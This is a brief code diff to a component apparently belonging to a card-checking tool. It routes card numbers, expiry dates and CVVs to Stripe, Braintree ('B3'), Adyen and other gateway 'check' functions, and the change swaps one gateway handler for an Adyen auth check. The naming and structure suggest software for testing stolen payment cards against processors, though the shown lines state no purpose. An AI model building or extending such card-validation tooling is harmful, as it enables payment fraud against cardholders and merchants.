@@ -2998,7 +2998,7 @@ const Gateways = () => {
         if (selectedGateway.id === "stripe_auth") {
           gatewayResponse = await checkCardViaApi(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "combined_auth") {
-          gatewayResponse = await checkCardViaCombined(cardData.card, cardData.month, cardData.year, cardData.cvv);
+          gatewayResponse = await checkCardViaAdyenAuth(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "braintree_auth") {
           gatewayResponse = await checkCardViaB3(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "paygate_charge") {
